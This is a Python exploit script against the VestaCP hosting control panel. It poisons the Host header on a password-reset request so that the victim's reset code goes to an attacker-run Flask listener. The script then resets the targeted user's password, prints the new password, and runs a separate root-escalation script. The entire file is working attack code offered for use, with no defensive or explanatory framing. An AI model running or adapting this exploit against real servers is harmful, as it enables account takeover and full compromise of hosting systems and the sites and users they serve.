from flask import Flask,request
from VestaFuncs import *
import os
import sys


if len(sys.argv) == 5:
	targetHost   = sys.argv[1]
	listenerPort = sys.argv[3]
	listenerHost = sys.argv[2]+':'+str(listenerPort)
	targetUser   = sys.argv[4]
else:
	print("Usage\npython3 vestaEMAIL.py https://target_host:8083 https://listener_host listener_Port target_username")
	exit()


app = Flask(__name__)

@app.route("/")
def helloWorld():
	return "Hello"


@app.route("/reset/", methods=['GET', 'POST'])
def listener():
	action = request.args.get('action')
	user   = request.args.get('user')
	code   = request.args.get('code')
	if action == 'confirm':
		print('[+] Account obtained '+user)
		print('[+] RKEY obtained '+code)
		newUserPassword = resetPassword(user,targetHost, code)
		if(newUserPassword):
			print('[+] New '+user+' account password :' +newUserPassword)
			os.system('python3 vestaROOT.py '+targetHost+ ' ' + user + ' '+newUserPassword)
	return 'OK'

if __name__ == '__main__':
	#os.system("openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365")
	us = requests.Session()
	r = us.get(targetHost + '/api/v1/login/index.php', verify=False,headers={'Host':listenerHost.replace('http://','').replace('https://','')})
	r2 = us.post(targetHost + '/api/v1/reset/index.php',verify=False, data={'user':targetUser}, headers={'Host':listenerHost.replace('http://','').replace('https://','')} )
	if r2.status_code == 200:
		print('[+] Reset requested for '+targetUser+' ...')
		app.run(debug=False, port=listenerPort, host='0.0.0.0', ssl_context=("cert.pem", "key.pem"))
	else:
		print('[!] Reset request failed ..')
		exit()
